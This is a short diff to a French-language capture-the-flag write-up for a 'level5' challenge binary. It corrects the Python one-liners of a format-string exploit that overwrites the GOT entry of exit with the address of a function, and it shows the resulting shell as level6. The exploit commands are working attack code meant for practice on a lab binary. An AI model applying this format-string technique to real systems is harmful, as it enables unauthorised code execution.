@@ -109,8 +109,8 @@ Pour ce faire nous allons associer au premier jmp du exit l'adresse du debut de 
 Adresse de o : 0x080484a4 ce qui donne 134513828 en decimal
 Adresse du jmp de exit : 0x8049838
 
-Exploit : python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' /tmp/level5 && cat /tmp/level5 - | ./level5 
-Ou plus court : (python -c 'print "\xdc\xf4\xff\xbf" + "%134513824d%4$n"'; cat)  | ./level5
+Exploit : python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/level5 && cat /tmp/level5 - | ./level5 
+Ou plus court : (python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat)  | ./level5
 
 whoami
 level6
